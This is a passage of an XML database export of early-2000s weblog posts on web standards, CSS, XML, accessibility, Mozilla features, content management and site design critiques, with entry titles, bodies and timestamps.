		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.ugcs.caltech.edu/~takoyaki/&quot;&gt;Micah Sittig&lt;/a&gt; made an interesting suggestion in a comment attached to an &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/06/#betterBlogrolling&quot;&gt;earlier entry&lt;/a&gt;. Micah suggested adding an inert &lt;code&gt;?lastUpdated=time&lt;/code&gt; attribute to links in my blog roll, causing browsers to display links to blogs that have been updated since the last visit in a different colour. I've implemented this temporarily, but I'm slightly worried about whether or not this constitutes abuse of the XHTML standard. The additional query string doesn't break any of the blogs on my blogroll but it is still resulting in fundamentally different page request being sent, which could lead to problems. I'll leave it for the moment, but I think this may need reconsidering in the future.&lt;/p&gt;</field>
		<field name="created">2002-07-06 11:55:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">152</field>
		<field name="title">Mozilla sidebar added</field>
		<field name="slug">mozillaSidebarAdded</field>
		<field name="body">&lt;p&gt;Thanks to another excellent suggestion from Micah, this site now has an experimental Mozilla sidebar. &lt;a href=&quot;javascript:if (window.sidebar.addPanel) { window.sidebar.addPanel (&amp;apos;Simon Willison\&amp;apos;s Blogroll&amp;apos;,&amp;apos;http://www.bath.ac.uk/~cs1spw/blog/mozillasidebar.php&amp;apos;,&amp;apos;&amp;apos;); }&quot;&gt;Click here to try it out&lt;/a&gt; (only Mozilla or NS6 owners need apply).&lt;/p&gt;

&lt;p&gt;UPDATE: For some reason visited links in the sidebar aren't showing up in a different colour. This seems to happen with other sidebars as well, which suggests it's a Mozilla issue.&lt;/p&gt;</field>
		<field name="created">2002-07-06 12:32:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">153</field>
		<field name="title">The Two Way Web</field>
		<field name="slug">theTwoWayWeb</field>
		<field name="body">&lt;p&gt;Dave Winer: &lt;a href=&quot;http://www.thetwowayweb.com/&quot;&gt;The Two Way Web&lt;/a&gt;. &lt;q cite=&quot;http://www.thetwowayweb.com/directory/8&quot;&gt;The Two-Way-Web is a vision for the Web as an easy writing and publishing environment&lt;/q&gt;. This is an old essay from March 2001 (I only found it today) which describes a vision of a web where content can be quickly and easily edited through a variety of tools, which communicate with content management systems using &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calling&quot;&gt;XML-RPC&lt;/acronym&gt; and &lt;acronym title=&quot;Simple Object Access Protocol&quot;&gt;SOAP&lt;/acronym&gt;. This is all stuff I've been thinking about recently, so it looks like I'm only a year and a half behind Dave ;)&lt;/p&gt;</field>
		<field name="created">2002-07-06 22:14:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">154</field>
		<field name="title">Paper Scissors Stone</field>
		<field name="slug">paperScissorsStone</field>
		<field name="body">&lt;p&gt;Paper Scissors Stone is &lt;a href=&quot;http://www.cs.ualberta.ca/~darse/rsb-results1.html&quot; title=&quot; The First International RoShamBo Programming Competition&quot;&gt;more complicated than I thought&lt;/a&gt; (via &lt;a href=&quot;http://boingboing.net/2002_07_01_archive.html#85225925&quot; title=&quot; Optimal Rock-Paper-Scissors software&quot;&gt;BoingBoing&lt;/a&gt;). This article from 1999 describes the second international RoShamBo programming contest, in which entrants had to provide a program that could play other programs at the classic childhood game:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;A good predictive algorithm will be able to play RoShamBo very well, without being explicitly programmed to solve that task. A few applications of such algorithms are data compression, grammatical inference, speech recognition, data mining, natural language understanding, syntactic pattern recognition, speech segmentation, machine translation, text generation, spelling correction, author identification, email classification, image recognition, stock market analysis, finding structure in data, analysis of DNA sequences, analysis of music, input methods for disabled users, and playing RoShamBo! &lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;The winning program Iocaine Powder is described by the author &lt;a href=&quot;http://ofb.net/~egnor/iocaine.html&quot; title=&quot;Iocaine Powder&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-07 11:57:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">155</field>
		<field name="title">Google OR</field>
		<field name="slug">googleOr</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://google.blogspace.com/archives/000396&quot;&gt;Another gem from the Google Weblog&lt;/a&gt; - Google not only accepts OR as a search modifier but allows you to use | instead and still get the same results.&lt;/p&gt;
</field>
		<field name="created">2002-07-07 12:11:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">156</field>
		<field name="title">Using web widgets wisely</field>
		<field name="slug">usingWebWidgetsWisely</field>
		<field name="body">&lt;p&gt;Jodi Bollaert: &lt;a href=&quot;http://www-106.ibm.com/developerworks/usability/library/us-widget/&quot;&gt;Using   Web widgets wisely&lt;/a&gt;. This is first in a two part series explaining the best practise for designing user interfaces using the form elements available in &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-07 16:03:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">157</field>
		<field name="title">Ooh Muse.net</field>
		<field name="slug">oohMuseNet</field>
		<field name="body">&lt;p&gt;I've been reading up on &lt;a href=&quot;http://www.muse.net/&quot;&gt;Muse.Net&lt;/a&gt;, and I like what I see. Muse.Net is a &lt;q cite=&quot;http://www.muse.net/faq/&quot;&gt;loosely-coupled, XML Web service derived Internet digital media supply chain&lt;/q&gt;. What that means in English is a system to let you listen to your private MP3 collection from any internet connected PC in the world, viasome very funky web service based technology. Your MP3s stay hosted on your own PC (so you need an always on internet connection) while the Muse.Net central service keeps track of what you've got and lets you log in from anywhere to listen remotely. Best of all the web service interface lets you do all kinds of fun things - for example &lt;a href=&quot;http://techno-weenie.com/2002/07/07.html#a1274&quot;&gt;techno weenie's OPML directory&lt;/a&gt; of his collection. For more detailed info check out the excellent &lt;a href=&quot;http://www.muse.net/faq/&quot;&gt;Muse.Net FAQ&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-07 22:10:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">158</field>
		<field name="title">Zeldman on accessibility</field>
		<field name="slug">zeldmanOnAccessibility</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.zeldman.com/daily/0702a.html#oscarmeyer&quot; title=&quot;Accessibility: the myth of ugly&quot;&gt;Jeffry Zeldman&lt;/a&gt;: &lt;q cite=&quot;http://www.zeldman.com/daily/0702a.html#oscarmeyer&quot;&gt;Many web practitioners still believe that accessiblity is an ugly, no-frills affair. Not true.&lt;/q&gt; An excellent piece on accessibility issues.&lt;/p&gt;</field>
		<field name="created">2002-07-08 22:04:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">159</field>
		<field name="title">Language independant storage</field>
		<field name="slug">languageIndependantStorage</field>
		<field name="body">&lt;p&gt;Today's (obvious) &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; realisation: Using XML for storage gives you a platform and language independant storage layer. If you later want to rewrite an application in a different language the data is there and ready to be processed, with no conversion necessary. OK so it's something that is shouted from the rooftops by XML advocates at every available opportunity but today I realised it for myself :)&lt;/p&gt;</field>
		<field name="created">2002-07-08 22:09:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">160</field>
		<field name="title">Why workflow?</field>
		<field name="slug">whyWorkflow</field>
		<field name="body">&lt;p&gt;I'm having trouble understanding the importance of workflow in a &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt;. As I see it, managing content assets and controlling which assets are ready for publication can be thought of as two very seperate processes. After all, content can and should be deployed in a whole variety of ways. A piece of content that is not yet ready for publication in a brochure may well be ready for publication on a web site (or may be fit a site aimed at one audience but not yet ready for a site targetted elsewhere).  Why tie the publication readiness of an item of content directly to the content, when it would make more sense to attach it to the place where the content will be published - so a site editor can decide when content is ready for publication without permanently altering the status of the content. Or have I completely missed the point?&lt;/p&gt;</field>
		<field name="created">2002-07-08 22:16:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">161</field>
		<field name="title">New bookmarklet</field>
		<field name="slug">newBookmarklet</field>
		<field name="body">&lt;p&gt;webgraphics have a &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000538.php#000538&quot; title=&quot;New bookmarklet: Page Weight &amp;amp; Speed&quot;&gt;new bookmarklet&lt;/a&gt; which measures the &quot;weight&quot; of a page (the combined size of the page and its graphics) and displays it along with an estimate of download times over different connections. Unfortunately it does not measure external &lt;acronym title=&quot;JavaScript&quot;&gt;JS&lt;/acronym&gt; or &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; files, and does not work in Mozilla. If you're in to bookmarklets (explained &lt;a href=&quot;http://www.bookmarklets.com/&quot; title=&quot;Bookmarklets.com&quot;&gt;here&lt;/a&gt;) take a look at webgraphics' excellent &lt;a href=&quot;http://www.web-graphics.com/&quot;&gt;favelets collection&lt;/a&gt; at the bottom of the right hand column of their front page.&lt;/p&gt;</field>
		<field name="created">2002-07-08 22:27:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">162</field>
		<field name="title">Sites bow to IE</field>
		<field name="slug">sitesBowToIE</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://news.com.com/2100-1023-941926.html?tag=fd_lede&quot;&gt;CNET&lt;/a&gt;:  &lt;q cite=&quot;http://news.com.com/2100-1023-941926.html?tag=fd_lede&quot;&gt;Even though all the major browsers are considered to be up to snuff on standards compliance, some Web authors still find it easier to code directly to IE--and test only with IE--rather than to open standards.&lt;/q&gt; Tell us something we &lt;em&gt;didn't&lt;/em&gt; know. Steve Champeon &lt;a href=&quot;http://www.webstandards.org/buzz/archive/2002_07.html#a000056&quot; title=&quot;a few valid points&quot;&gt;replies&lt;/a&gt; over at the Web Standards project and highlights some inaccuracies in the article but the basic message remains unfortunately true.&lt;/p&gt;</field>
		<field name="created">2002-07-08 22:40:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">163</field>
		<field name="title">XML-RPC debugging</field>
		<field name="slug">xmlRpcDebugging</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://techno-weenie.com/2002/07/08.html#a1279&quot;&gt;techno weenie&lt;/a&gt;: &lt;a href=&quot;http://www.myelin.co.nz/notes/xmlrpc-debug-proxy.html&quot;&gt;A Python XML-RPC debugging proxy script&lt;/a&gt;. This solves the problem of &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calling&quot;&gt;XML-RPC&lt;/acronym&gt; errors from &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; being sent out with the XML-RPC response packet and breaking any XML parser trying to recieve the packet. Instead you can test your script by aiming at the proxy script which will dump any problems to the console for you.&lt;/p&gt;</field>
		<field name="created">2002-07-09 09:07:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">164</field>
		<field name="title">Using SCP</field>
		<field name="slug">usingScp</field>
		<field name="body">&lt;p&gt;I'm slowly migrating this blog to another server (and rewriting it to use mySQL instead of serialized objects at the same time). After about half an hour of trying to figure out the best way of transferring the whole &lt;code&gt;blog/&lt;/code&gt; directory from this server to the new one without using &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; I figured out a way of doing it with &lt;code&gt;scp&lt;/code&gt; (thanks to &lt;a href=&quot;http://www.myrddin.demon.co.uk/copy-net.html&quot; title=&quot;How To Copy Files Across A Network&quot;&gt;this tutorial&lt;/a&gt;):&lt;/p&gt;

&lt;p&gt;&lt;code&gt;scp -r blog/ username@www.wherever.com:/home/username/public_html/&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Simple when you know how, a right &lt;acronym title=&quot;Pain In The Arse&quot;&gt;PITA&lt;/acronym&gt; when you don't.&lt;/p&gt;</field>
		<field name="created">2002-07-09 09:09:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">165</field>
		<field name="title">Webdocs.org</field>
		<field name="slug">webDocs</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.webdocs.org/&quot;&gt;Webdocs.org&lt;/a&gt; is &lt;q cite=&quot;http://www.webdocs.org/&quot;&gt;an online library of various freely available software documentation.&lt;/q&gt; The site uses frames with a tree style navigation menu on the left and loads (externally hosted) documentation on the right. At the moment they only cover Python but more will be added soon - in the meantime the Python collection is quite impressive.&lt;/p&gt;</field>
		<field name="created">2002-07-09 09:18:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">166</field>
		<field name="title">Mozilla oddity</field>
		<field name="slug">mozillaOddity</field>
		<field name="body">&lt;p&gt;Mozilla oddity - if you rename a bookmark to the the same name as it's shortcut keyword the shortcut keyword will stop functioning. I couldn't see it in &lt;a href=&quot;http://bugzilla.mozilla.org/&quot;&gt;Bugzilla&lt;/a&gt; so I've submitted it as &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=156418&quot; title=&quot;bookmark shortcut keywords stop working if bookmark is renamed to same as keyword&quot;&gt;bug 156418&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-09 09:32:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">167</field>
		<field name="title">CherryPy</field>
		<field name="slug">cherryPy</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.cherrypy.org/&quot;&gt;CherryPy&lt;/a&gt; is an interesting open source Python application server. Dynamic sites are constructed in a special templating language which is then compiled by CherryPy to create a stand alone executable Python script complete with a built in web server. This can then be deployed anywhere with a Python interpreter. CherryPy comes with an &lt;a href=&quot;http://www.cherrypy.org/static/html/tut/index.html&quot; title=&quot;CherryPy Tutorial&quot;&gt;excellent tutorial&lt;/a&gt; and a small but useful set of &lt;a href=&quot;http://www.cherrypy.org/static/html/howto/index.html&quot; title=&quot;CherryPy HOWTOs&quot;&gt;HOWTOs&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-09 10:23:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">168</field>
		<field name="title">PHP XML Classes</field>
		<field name="slug">phpXmlClasses</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://phpxmlclasses.sourceforge.net/&quot;&gt;PHP XML Classes&lt;/a&gt; - &lt;q cite=&quot;http://phpxmlclasses.sourceforge.net/&quot;&gt;A collection of classes and resources to process XML using PHP&lt;/q&gt;. Includes &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; implementations of Xquery lite and &lt;acronym title=&quot;RDF Data Query Language&quot;&gt;RDQL&lt;/acronym&gt; along with parsers for &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt;, &lt;acronym title=&quot;Rich Site Summary&quot;&gt;RSS&lt;/acronym&gt; and &lt;acronym title=&quot;Resource Directory Description Language&quot;&gt;RDDL&lt;/acronym&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-09 10:29:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">169</field>
		<field name="title">Open source CMS list</field>
		<field name="slug">openSourceCmsList</field>
		<field name="body">&lt;p&gt;An excellent &lt;a href=&quot;http://www.la-grange.net/cms&quot;&gt;list of open source content management systems&lt;/a&gt; (via &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-07-09 10:46:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">170</field>
		<field name="title">Logoed</field>
		<field name="slug">logoed</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.logoed.fsnet.co.uk/index2.html&quot;&gt;Logoed&lt;/a&gt;: &lt;q cite=&quot;http://www.logoed.fsnet.co.uk/index2.html&quot;&gt;logo inspiration for graphic designers&lt;/q&gt;. A large collection of real word logos to help kickstart the creative process.&lt;/p&gt;</field>
		<field name="created">2002-07-09 15:02:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">171</field>
		<field name="title">Accessible lists</field>
		<field name="slug">accessibleLists</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/07/09.html#day_22_using_real_lists_or_faking_them_properly&quot;&gt;Today's tip from Mark&lt;/a&gt; informs us that &quot;real&quot; lists are good for accessibility. They are also fantastic for writing maintainable code. Thanks to &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;, a humble unordered list can be transformed with custom bullet points, funky backgrounds, rollover effects and borders - all hidden away in the stylesheet leaving just basic list markup in the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;. Adding a new item is as easy as &lt;code&gt;&amp;lt;li&amp;gt;item&amp;lt;/li&amp;gt;&lt;/code&gt;. W3Schools have &lt;a href=&quot;http://www.w3schools.com/css/css_list.asp&quot; title=&quot;CSS List Properties&quot;&gt;a good CSS list reference&lt;/a&gt; complete with examples, and &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/07/04/#usefulCssLinks&quot;&gt;this earlier post&lt;/a&gt; on my blog lists some resources for dealing with unpredictable list margins.&lt;/p&gt;</field>
		<field name="created">2002-07-09 17:36:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">172</field>
		<field name="title">Rounded corners in CSS</field>
		<field name="slug">roundedCornersInCSS</field>
		<field name="body">&lt;p&gt;Courtesy of &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt;: Two examples of expanding boxes in &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; with images in the corners, ideal for that trendy rounded corner effect: &lt;a href=&quot;http://www.v2studio.com/k/lab/corners/&quot; title=&quot;CSS corners example 1&quot;&gt;One&lt;/a&gt; and &lt;a href=&quot;http://www.jimdabell.com/corners/&quot; title=&quot;CSS corners example 2&quot;&gt;Two&lt;/a&gt;. Mozilla &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/demos/moz-border-radius.html&quot; title=&quot;-moz-border-radius demo&quot;&gt;has experimental support &lt;/a&gt;for rounded corners that may or may not end up in CSS3, but if it aint in the standards it aint coming in.&lt;/p&gt;</field>
		<field name="created">2002-07-09 21:57:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">173</field>
		<field name="title">Alt all the way</field>
		<field name="slug">altAllTheWay</field>
		<field name="body">&lt;p&gt;Mark says that &lt;a href=&quot;http://diveintomark.org/archives/2002/07/10.html#day_23_providing_text_equivalents_for_images&quot; title=&quot;Day 23: Providing text equivalents for images&quot;&gt;today is the most important day&lt;/a&gt; of his whole accessibility series, and who are we to argue? The topic is the &lt;code&gt;alt&lt;/code&gt; attribute for images, and the message is simple: Every image should have one, even if the image is there purely as layout decoration (in which case &lt;a href=&quot;http://diveintomark.org/archives/2002/07/08.html#day_21_ignoring_spacer_images&quot; title=&quot;Day 21: Ignoring spacer images&quot;&gt;an empty attribute should be used&lt;/a&gt;). Surprisingly Mark does not give advice on chosing text for the attribute but he does provide an excellent further reading list, which includes Hixie's superb &lt;a href=&quot;http://www.hixie.ch/advocacy/alttext&quot;&gt;Mini FAQ About The Alternate Text Of Images&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-10 10:12:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">174</field>
		<field name="title">xmlhack news wire</field>
		<field name="slug">xmlhackNewsWire</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.xmlhack.com/&quot;&gt;xmlhack&lt;/a&gt;'s &quot;Editor's Newswire&quot; is interesting. It is a small column (&lt;a href=&quot;http://www.xmlhack.com/newswire.php&quot; title=&quot;How the newswire works&quot;&gt;explained here&lt;/a&gt;) located on the right hand side of the site that displays the latest &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; news snippets &quot;in real time&quot;. The interesting part is how the section is updated - an &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; bot (&lt;a href=&quot;http://usefulinc.com/chump&quot;&gt;The Daily Chump Bot&lt;/a&gt;, written in Python) monitors a channel for specific commands from authorised users, and produces an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; file of new snippets. Site updates through &lt;acronym title=&quot;Internet Relay Chat&quot;&gt;IRC&lt;/acronym&gt; (or instant messenging services such as &lt;acronym title=&quot;MicroSoft Network Messenger&quot;&gt;MSN&lt;/acronym&gt; or Jabber) is a concept which we could see a lot more of, especially in this age of web services.&lt;/p&gt;</field>
		<field name="created">2002-07-10 12:50:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">175</field>
		<field name="title">The semantic web explained</field>
		<field name="slug">semanticWebExplained</field>
		<field name="body">&lt;p&gt;I just found a nice, clear and above all short explanation of the Semantic Web at The &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt;'s &lt;a href=&quot;http://www.w3.org/TandS/#Semantic&quot;&gt;Technology &amp;amp; Society Domain&lt;/a&gt; page:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.w3.org/TandS/#Semantic&quot;&gt;&lt;p&gt;The Semantic Web seeks to augment the current Web of &lt;em&gt;linked documents&lt;/em&gt; with a Web of &lt;em&gt;linked data&lt;/em&gt;. Today, Web users follow links from document to document in a largely manual process. Tomorrow, semantically-enabled links will enable both human users, and human users assisted by computers, to navigated these links and find the information they are looking for. [...] To reach its full potential, the Web must becomes a place where data can be shared and processed by automated tools as well as by people.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-07-10 15:49:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">176</field>
		<field name="title">CSS numbered code listings</field>
		<field name="slug">numberedCodeListing</field>
		<field name="body">&lt;p&gt;I've been experimenting with using &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and &amp;lt;ol&amp;gt; tags to format code listings, complete with line numbering. Here's what I've got so far: &lt;a href=&quot;http://development.incutio.com/simon/numbered-code-experiment.html&quot;&gt;Numbered Code Listing Experiment&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-10 15:52:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">177</field>
		<field name="title">First Church of Pac-Man</field>
		<field name="slug">firstChurchOfPacman</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.flamingmayo.com/firstchurchofpacman/index.htm&quot;&gt;The First Church of Pac-Man&lt;/a&gt;: &lt;q cite=&quot;http://www.flamingmayo.com/firstchurchofpacman/index.htm&quot;&gt;Warning! Not a Religion - Do Not Worship&lt;/q&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-10 19:29:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">178</field>
		<field name="title">A million pounds down the drain</field>
		<field name="slug">aMillionPoundsDownTheDrain</field>
		<field name="body">&lt;p&gt;This site will make you cry: &lt;a href=&quot;http://www.connected-earth.com/&quot;&gt;Connected Earth&lt;/a&gt;, BT's new million pound (yes that's £1,000,000) online museum devoted to the history of communications. It's so bad it isn't even funny - and don't even think about trying to visit without Flash (I did and was presented with an alternative interface consisting of a single select box that refused to respond to mouse clicks). Load up on IE5+ and Flash and you'll be treated to the single most unintuitive interface I have ever seen - good luck figuring out what the small, identical purple circles do. There are 2,000 pages of extensively researched content in there somewhere - obviously the designers thought it would be more &quot;sticky&quot; if you had to work &lt;em&gt;really&lt;/em&gt; hard to find them. I could rant more, but quite frankly I just want to go to bed.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; On second thoughts, if you have a blog - blog it. Enough blogger interest leads to mainstream media interest, and the more bad press this gets the better. Sites like this can not be allowed to go without comment, and the more comment the better. Let's humiliate these people in to never, ever creating something this bad again.&lt;/p&gt;</field>
		<field name="created">2002-07-11 00:29:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">179</field>
		<field name="title">More Connected Earth</field>
		<field name="slug">moreConnectedEarth</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.connected-earth.com/&quot;&gt;Connected Earth&lt;/a&gt; is getting a fair amount of criticism for its shoddy browser detection. In my opinion, browser detection is only a small part of its problems. Should you get past the front door the interface used to present information is &quot;mystery meat&quot; navigation at its very worst - identically coloured dots which reveal only a hint of their purpose when you hover over them, leading to pages that contain two or three paragraphs of information at the most before you have to click  on another dot. Pages are slow to load even on broadband so trying to follow content quickly becomes a painful experience. There's a lot more to this dinosaur than just a browser detect page.&lt;/p&gt;</field>
		<field name="created">2002-07-11 09:24:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">180</field>
		<field name="title">Image map accessibility</field>
		<field name="slug">imageMapAccessibility</field>
		<field name="body">&lt;p&gt;Mark Pilgrim continues to educate with &lt;a href=&quot;http://diveintomark.org/archives/2002/07/11.html#day_24_providing_text_equivalents_for_image_maps&quot; title=&quot;Day 24: Providing text equivalents for image maps&quot;&gt;day 24 of his series&lt;/a&gt;. Client side image maps need not pose a barrier to accessibility thanks to the helpful way in which alternative browsers use the alt attribute. They still aren't much use for people using a normal (non-lynx) browser with images turned off though, and server side image maps are a big no.&lt;/p&gt;</field>
		<field name="created">2002-07-11 16:28:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">181</field>
		<field name="title">Lovely PNGs</field>
		<field name="slug">lovelyPNGs</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.panic.com/audion/faces.php&quot; title=&quot;Panic - Extra Faces for Audion&quot;&gt;Here's a treat&lt;/a&gt; for anyone with a browser that supports alpha transparency in &lt;acronym title=&quot;Portable Network Graphics&quot;&gt;PNG&lt;/acronym&gt;s (Mozilla and IE5/Mac do, IE/Win doesn't). Click on one of the little magnifying glasses under a thumbnail and the skin in question will pop up as a floating &lt;acronym title=&quot;Portable Network Graphics&quot;&gt;PNG&lt;/acronym&gt;, which you can drag around the screen. Admire the drop shadows, translucency and general prettyness and ask yourself why Microsoft haven't implemented this X years after &lt;acronym title=&quot;Portable Network Graphics&quot;&gt;PNG&lt;/acronym&gt; became a standard. Hat tip to Boris Mann on &lt;a href=&quot;http://lists.evolt.org/&quot; title=&quot;Evolt.org mailing list&quot;&gt;thelist&lt;/a&gt; for the link.&lt;/p&gt;</field>
		<field name="created">2002-07-11 18:21:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">182</field>
		<field name="title">Bad faith my arse</field>
		<field name="slug">badFaithMyArse</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.arbforum.com/domains/decisions/112451.htm&quot; title=&quot;Molson Canada v. %2d%2d&quot;&gt;This is ludicrous&lt;/a&gt;. &lt;acronym title=&quot;National Arbitration Forum&quot;&gt;NAF&lt;/acronym&gt; have ordered the transfer of the domain name canadian.biz to Molson beer, who hold a trademark on the word &quot;Canadian&quot; (a brand of beer):&lt;/p&gt;&lt;blockquote cite=&quot;http://www.arbforum.com/domains/decisions/112451.htm&quot;&gt;&lt;p&gt;I find that the registration by the Respondent of record [...] four years subsequent to Complainant’s registration of its Canadian trademark, and almost 50 years subsequent to the Complainant’s first use of the mark constitutes bad faith.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Bad faith is one of the three elements required in order for a domain to be transferred. The domain registrant intended to run a directory of Canadian businesses. Bad faith my arse! More info on &lt;a href=&quot;http://www.icannwatch.org/article.php?sid=853&quot; title=&quot;Canadian.biz -- Round Two !&quot;&gt;ICANNWatch&lt;/a&gt; and &lt;a href=&quot;http://yro.slashdot.org/yro/02/07/11/1320257.shtml?tid=95&quot; title=&quot;Latest UDRP Stupidity: Unix.org, Canadian.biz&quot;&gt;Slashdot&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-07-11 19:00:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">183</field>
		<field name="title">DVB-HTML</field>
		<field name="slug">dvbHtml</field>
		<field name="body">&lt;p&gt;New article on Evolt: &lt;a href=&quot;http://www.evolt.org/article/headline/25/33143/index.html&quot;&gt;DVB-HTML a new standard?&lt;/a&gt;. The article describes &lt;acronym title=&quot;Digital Video Broadcasting - HyperText Markup Language&quot;&gt;DVB-HTML&lt;/acronym&gt;, a new standard being developed to allow the next wave of digital televisions to access internet content. The good news is that &lt;acronym title=&quot;Digital Video Broadcasting - HyperText Markup Language&quot;&gt;DVB-HTML&lt;/acronym&gt; complies with the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt;'s &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; modularisation requirement, and supports &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;, &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;. As I understand it, this means that if you author your pages in validated &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; they will be ready for viewing on digital TVs. &lt;a href=&quot;http://www.webstandards.org/&quot; title=&quot;The Web Standards Project&quot;&gt;Web Standards&lt;/a&gt; at work.&lt;/p&gt;</field>
		<field name="created">2002-07-12 11:34:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">184</field>
		<field name="title">Busy day</field>
		<field name="slug">busyDay</field>
